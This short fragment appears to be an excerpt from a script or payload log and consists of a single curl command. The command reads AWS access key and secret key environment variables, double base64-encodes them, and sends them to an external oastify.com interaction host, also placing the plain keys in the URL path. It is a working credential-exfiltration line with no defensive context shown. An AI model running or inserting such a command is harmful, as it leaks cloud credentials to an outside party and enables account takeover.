...
curl -d creds="$(echo $AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY | base64 | base64)" https://312jfgo5i2aj5mg9wee3iyom2d8bw1kq.oastify.com/$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY
